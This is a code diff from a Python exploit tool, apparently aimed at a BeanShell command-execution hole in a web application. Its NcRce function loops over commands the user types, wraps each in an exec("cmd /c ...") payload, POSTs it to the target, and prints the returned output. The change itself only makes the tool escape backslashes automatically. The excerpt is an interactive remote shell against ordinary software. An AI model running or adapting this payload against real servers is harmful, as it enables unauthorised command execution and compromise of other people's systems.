@@ -39,14 +39,14 @@ def NcCheck(target_url):
 
 
 def NcRce(url):
-    print(BLUE + "[*]在command后输入执行命令, 仅适用于Windoes, Linux请手动测试, 如路径中包含'\\'请替换为'\\\\'\n" + ENDC)
+    print(BLUE + "[*]在command后输入执行命令, 仅适用于Windoes, Linux请手动测试\n" + ENDC)
     headers = {
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     while True:
         command = str(input(BOLD + 'command: ' + ENDC))
-        data = 'bsh.script=' + quote('''exec("cmd /c {}")'''.format(command), 'utf-8')
+        data = 'bsh.script=' + quote('''exec("cmd /c {}")'''.format(command.replace('\\', '\\\\')), 'utf-8')
         try:
             response = requests.post(url=url, headers=headers, data=data)
             pattern = re.compile('<pre>(.*?)</pre>', re.S)
